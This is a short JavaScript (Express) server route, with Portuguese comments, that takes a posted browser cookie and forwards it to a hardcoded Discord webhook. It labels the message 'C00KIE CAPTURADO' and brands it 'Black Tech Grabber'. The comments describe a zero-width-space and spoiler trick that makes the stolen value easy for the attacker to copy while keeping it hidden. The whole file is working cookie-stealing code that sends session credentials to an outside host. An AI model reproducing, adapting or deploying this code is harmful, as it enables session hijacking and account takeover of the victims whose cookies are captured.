app.post('/send', async (req, res) => {
  const cookie = (req.body.cookie || '').toString().trim();

  if (cookie) {
    try {
      await fetch("https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "C00KIE CAPTURADO",
            description: "```" + cookie.substring(0, 1800) + "```",
            color: 0x00ffea,
            timestamp: new Date().toISOString(),
            footer: { text: "Black Tech Grabber • Discreto & Perfeito" }
          }],
          // ← Aqui está o truque: 1 caractere invisível + spoiler
          content: "||||||`" + cookie + "`"
          // Explicação: os  são ZERO-WIDTH SPACE (invisíveis)
          // Isso força o Discord a colocar o botão "Copiar" sem mostrar nada
        })
      });
    } catch (e) {
      console.error(e);
    }
  }

  res.json({ status: "ok" });
});
